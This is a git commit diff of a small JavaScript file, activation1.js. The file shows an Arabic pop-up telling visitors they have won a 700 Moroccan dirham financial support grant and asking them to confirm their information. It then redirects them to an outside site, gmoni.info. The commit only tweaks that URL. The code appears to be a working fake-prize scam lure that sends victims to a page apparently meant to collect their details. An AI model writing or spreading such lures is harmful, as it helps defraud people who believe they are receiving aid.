e15a778faca8593195cd0cc789fefc6c0caa8f6e
help0z <triplerain29@gmail.com>
2025-12-20 19:38:20 +0100

    Update activation1.js

--- activation1.js
+++ activation1.js
@@ -1,5 +1,5 @@
 var password = 'أرسل الآن'
 password=prompt('تهانينا! أنت مؤهل للاستفادة من منحة الدعم المالي بقيمة 700 درهم مغربي (700 DH). يرجى الضغط على “موافق” لتأكيد معلوماتك واستلام مبلغ 700 درهم مغربي (700 DH) الآن.','Submit Now');
 if (password != 'أرسل الآن') {
-location.href='https://gmoni.info/MAD-700-CAN.html';
+location.href='https://gmoni.info/MAD-700-CAN.html/';
 }
